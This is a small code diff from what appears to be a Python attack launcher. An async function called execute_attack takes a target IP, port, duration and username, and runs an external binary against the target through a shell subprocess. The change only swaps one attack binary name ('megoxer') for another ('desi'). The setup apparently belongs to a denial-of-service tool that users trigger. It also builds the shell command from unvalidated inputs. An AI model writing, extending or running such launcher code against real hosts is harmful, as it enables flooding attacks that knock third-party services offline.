@@ -241,7 +241,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process
         proc = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {duration}",
+            f"./desi {ip} {port} {duration}",
             stderr=asyncio.subprocess.PIPE
         )
 
